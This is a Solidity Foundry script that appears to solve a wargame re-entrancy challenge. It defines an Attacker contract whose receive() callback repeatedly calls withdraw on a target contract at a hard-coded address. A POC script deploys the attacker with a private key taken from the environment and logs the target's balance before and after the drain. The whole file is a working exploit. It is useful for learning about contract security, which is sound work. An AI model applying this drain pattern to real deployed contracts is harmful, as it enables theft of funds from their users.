// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/10_Re-entrancy.sol";

contract Attacker{
    Reentrance public target;
    uint256 public count;
    uint256 public total;

    constructor(Reentrance _target) payable {
        target = _target;
    }

    function exploit() external {
        total = address(target).balance;
        target.donate{value : total / 10}(address(this));
        target.withdraw(total / 10);
        (bool res,) = msg.sender.call{value : address(this).balance}("");
        require(res, "Failed Transaction");
    }

    receive() external payable {
        while (count < 10) {
            count ++;
            target.withdraw(total / 10);
        }
    }
}

contract POC is Script {
    Reentrance public target;
    Attacker public attacker;

    function setUp() external {
        target = Reentrance(payable(0xDD0b6782Ba188fE1177555dAAA516EAbf5988B19));
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        uint256 balance = payable(address(target)).balance;
        console.log("before balance: ", balance);

        attacker = new Attacker{ value : balance / 10}(target);
        attacker.exploit();

        balance = payable(address(target)).balance;
        console.log("after  balance: ", balance);

        vm.stopBroadcast();
    }
}